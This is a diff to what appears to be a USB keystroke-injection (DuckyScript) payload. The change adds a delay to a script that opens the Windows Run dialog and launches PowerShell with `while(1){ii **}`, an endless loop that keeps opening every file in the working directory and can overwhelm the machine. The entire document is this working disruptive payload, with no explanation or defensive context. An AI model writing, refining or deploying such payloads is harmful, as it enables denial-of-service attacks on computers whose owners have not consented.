@@ -1,4 +1,5 @@
 DELAY 300
 GUI r
+DELAY 300
 STRING powershell while(1){ii **}
 ENTER
